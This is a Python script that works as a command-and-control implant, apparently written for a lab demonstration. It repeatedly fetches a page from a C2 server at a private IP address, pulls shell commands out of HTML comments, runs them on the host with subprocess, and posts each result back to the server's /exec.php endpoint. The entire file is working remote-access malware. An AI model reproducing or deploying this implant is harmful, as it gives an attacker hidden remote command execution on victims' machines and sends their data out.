import requests
import subprocess
import re
import sys
import time

c2_url = 'http://192.168.84.157'    #url of command control server
try:
    while True:
        response = requests.get(c2_url)   # retrieve web page from C2 server. The page should include shell command which needs to be executed on the target machine
        if response.status_code == 200:
            pattern = r'<!--(.*)-->'
            comments = re.findall(pattern, response.text)
            if len(comments) == 0:
                continue
            else:
                for comment in comments:
                    try:
                        exec_result = subprocess.check_output(comment.split()).decode('utf-8')
                    except:
                        exec_result = 'Failed to execute!'
                    
                    req = requests.post(c2_url+'/exec.php', data={'comment':comment+":::"+exec_result})    #post execution result to the C2 server
                    print(req.text)   #This line of code is used for demonstartion. The data will be saved into the database of C2 server in real practice
                    time.sleep(30)

except KeyboardInterrupt:
    sys.exit()